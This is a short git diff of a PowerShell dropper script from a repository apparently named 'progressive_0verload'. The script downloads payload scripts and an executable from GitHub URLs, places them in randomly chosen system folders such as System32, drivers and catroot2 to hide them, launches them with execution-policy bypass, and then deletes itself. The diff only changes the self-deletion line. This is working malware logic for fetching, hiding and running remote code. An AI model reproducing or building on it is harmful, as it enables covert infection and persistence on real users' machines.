@@ -9,7 +9,6 @@ if(-not (([System.Security.Principal.WindowsPrincipal][System.Security.Principal
 $initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
 $initServiceFwdmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwdmon.ps1"
 $initFinde = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/finde.exe"
-$currLoc = $MyInvocation.MyCommand.Path
 $paths = @("$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\System32","$env:windir\System32\drivers","$env:windir\System32\en-US","$env:windir\System32\LogFiles\WMI","$env:windir\System32\wbem\en-US","C:\Recovery","$env:temp","$env:ProgramData","$env:windir\SysWOW64","$env:appdata\SystemInformer","$env:localappdata\Microsoft\Windows","$env:windir\System32\WindowsPowerShell\v1.0\Modules","$env:windir\System32\drivers\etc","$env:windir\System32\spool\drivers\x64\3\en-US","$env:windir\System32\spool","$env:windir\System32\catroot2","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\NetworkService")
 $initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
@@ -85,4 +84,4 @@ Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", 
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceFwdmonPath -basePath '$basePath\yXureYzQpIRLN'" -Wait
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initFindePath"
 
-Remove-Item -Path $currLoc -Force -ErrorAction SilentlyContinue
+Remove-Item -Path $f -Force -ErrorAction SilentlyContinue
